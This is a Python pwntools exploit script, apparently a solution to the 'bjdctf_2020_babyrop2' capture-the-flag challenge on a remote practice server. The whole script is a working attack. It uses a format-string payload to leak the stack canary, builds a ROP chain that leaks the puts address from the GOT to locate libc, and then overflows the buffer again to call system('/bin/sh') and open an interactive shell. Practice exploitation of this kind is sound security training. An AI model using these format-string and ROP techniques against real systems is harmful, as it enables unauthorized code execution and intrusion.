from pwn import *

context.log_level='debug'

p=remote('node5.buuoj.cn',28938)

elf=ELF("/home/lixingjian/pwn/bjdctf_2020_babyrop2")
# libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")

p.recvuntil('u!')
payload1=b'%7$p'

p.sendline(payload1)

p.recvuntil(b'0x')
canary_str=p.recvline().strip()
canary = int(canary_str, 16)

log.info("canary1: "+hex(canary))

p.recvuntil(b'story!')

puts_got=elf.got['puts']
puts_plt=elf.symbols['puts']
pop_rdi_ret=0x400993
vuln_addr=0x400887
payload2=b'a'*24+p64(canary)+p64(0)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(0x400887)
p.sendline(payload2)

log.info("canary2: "+hex(canary))

rec=p.recvuntil("\x7f")
puts_libc=u64(rec.ljust(8,b'\x00'))

sys_plt=puts_libc-0x31580
binsh=puts_libc+0x1334da

log.info("canary3: "+hex(canary))
ret_addr=0x4005f9
p.recvuntil(b'story!')
payload3=b'a'*24+p64(canary)+p64(0)+p64(ret_addr)+p64(pop_rdi_ret)+p64(binsh)+p64(ret_addr)+p64(sys_plt)
p.sendline(payload3)

p.interactive()